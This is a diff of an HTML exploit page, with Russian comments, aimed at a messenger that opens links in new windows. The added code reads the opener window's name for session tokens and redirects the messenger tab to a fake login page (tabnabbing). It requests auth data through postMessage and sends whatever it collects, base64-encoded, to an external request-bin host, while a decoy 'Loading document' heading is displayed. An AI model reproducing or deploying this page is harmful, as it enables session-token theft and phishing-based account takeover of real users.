@@ -1,25 +1,47 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+</head>
 <body>
-    <div id="status">Синхронизация !!!!! данных...</div>
-    
-    <form id="stealForm" action="https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4" method="GET">
-        <input type="hidden" name="token_leak" id="tokenField">
-        <input type="hidden" name="debug_info" id="debugField">
-    </form>
-
     <script>
-    // Слушаем все сообщения, которые мессенджер может слать в открытые окна
-    window.addEventListener("message", function(event) {
-        fetch('https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4?postmessage_leak=' + JSON.stringify(event.data));
-    }, false);
+        const webhook = "https://bin.h00k.dev/96d9ed8c-4542-406c-a5df-41eb5a2d0af4";
 
-    // Пытаемся спровоцировать мессенджер прислать нам что-то
-    if (window.opener) {
-    // Мы подменяем страницу в открытом окне мессенджера на твой фишинг
-    window.opener.location = "https://lin-li-shu.github.io/test-preview/index/fake-login.html";
-}
-</script>
+        async function exploit() {
+            let data = {};
+
+            try {
+                if (window.opener) {
+                    // 1. Проверка window.name (часто содержит токены сессии)
+                    data.window_name = window.opener.name;
+
+                    // 2. Tabnabbing (Подмена вкладки мессенджера)
+                    // Это доказывает возможность угона аккаунта через фишинг
+                    window.opener.location = "https://lin-li-shu.github.io/test-preview/index/fake-login.html";
+                    data.tabnabbing = "success";
+                }
+            } catch (e) {
+                data.error = e.message;
+            }
+
+            // Отправка всего улова на бин
+            fetch(webhook + "?leak=" + btoa(JSON.stringify(data)), {mode: 'no-cors'});
+        }
+
+        // Слушаем postMessage (вдруг они ответят на "ping")
+        window.addEventListener("message", (e) => {
+            fetch(webhook + "?postmessage=" + btoa(JSON.stringify(e.data)), {mode: 'no-cors'});
+        });
+
+        // Запуск
+        exploit();
+        
+        // Попытка спровоцировать утечку через postMessage
+        if (window.opener) {
+            window.opener.postMessage('{"type":"GET_AUTH"}', "*");
+        }
+    </script>
+    <h2>Документ загружается...</h2>
 </body>
 </html>
